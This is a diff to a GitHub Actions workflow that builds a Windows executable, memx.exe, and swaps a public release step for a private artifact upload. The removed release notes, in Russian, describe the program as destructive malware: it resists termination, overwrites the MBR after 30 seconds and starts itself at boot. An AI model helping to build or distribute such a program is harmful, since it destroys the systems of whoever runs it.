@@ -25,22 +25,9 @@ jobs:
           /link user32.lib gdi32.lib winmm.lib shell32.lib ole32.lib uuid.lib advapi32.lib ^
           /SUBSYSTEM:WINDOWS /OUT:memx.exe
 
-      - name: Create Release
-        uses: softprops/action-gh-release@v1
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
         with:
-          files: memx.exe
-          tag_name: memx-latest
-          name: "MEMX — последняя сборка"
-          body: |
-            ## 🔥 MEMX.exe
-            
-            - 29 ультра-эффектов
-            - Защита от завершения (3 watchdog)
-            - Запись в MBR через 30 секунд
-            - Автозапуск при старте Windows
-            
-            **Запускай ТОЛЬКО в виртуалке!**
-          draft: false
-          prerelease: true
-        env:
-          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          name: memx-executable
+          path: memx.exe
+          retention-days: 30
